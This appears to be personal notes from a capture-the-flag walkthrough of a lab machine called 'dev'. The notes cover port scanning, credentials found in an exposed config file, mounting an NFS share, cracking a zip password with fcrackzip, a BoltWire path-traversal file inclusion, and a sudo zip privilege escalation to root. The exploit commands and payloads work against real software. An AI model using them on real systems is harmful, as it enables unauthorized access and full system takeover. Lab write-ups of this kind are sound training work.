ip 192.168.60.7
nmap gives 
		open ports 80/http, 8080/http, 22/ssh, 2049/nfs, 111/rpcbind

- from `http://192.168.60.7/app/config/config.yml` we find
		username: bolt
	    password: I_love_java
	    
- to list directories in a fileshare `showmount -e 192.168.60.7 `
```
		Export list for 192.168.60.7:
		/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16```

```
- to mount 
	-  make a directory to mount filesystem to :  `mkdir /mnt/[foldername|dev]`
	-  `mount -t nfs [ip]:[share path] [dir to mount to]`
			- `mount -t nfs 192.168.60.7:/srv/nfs /mnt/dev`

- found  `save.zip` 
- to unzip `unzip [path]`
- we can use *fcrackzip* to crack 
	- `fcrackzip -v -u -D -p [dictionary] [filepath]`
		- -v : verbose
		- -u : unzip
		- -D : dictionary attack
		- -p : using a file
- password found as **java101**
- unziping gives 2 files : id_rsa and todo.txt

- in searchsploit we find a boltfire vuln
		BoltWire 6.03 - Local File Inclusion   

		Steps to Reproduce:
		1) Using HTTP GET request browse to the following page, whilst being authenticated user.
		http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd

- it works at `http://192.168.60.7:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd`
- we find user *jeanpaul*

- `ssh -i id_rsa jeanpaul@192.168.60.7` with password: I_love_java gives access to jeanpaul@dev

- `sudo -l` gives 
			User jeanpaul may run the following commands on dev:
			(root) NOPASSWD: /usr/bin/zip
 - ie., zip can run as root with no password
 - ### [GTFOBins](https://gtfobins.github.io/)  is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
	 - in it we find that there is vuln to get to sudo
		If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
		```
		  TF=$(mktemp -u)
		    sudo zip $TF /etc/hosts -T -TT 'sh #'
		    sudo rm $TF
		``` 
- **GOT access as root**
	- found flag.txt - Congratz on rooting this box !
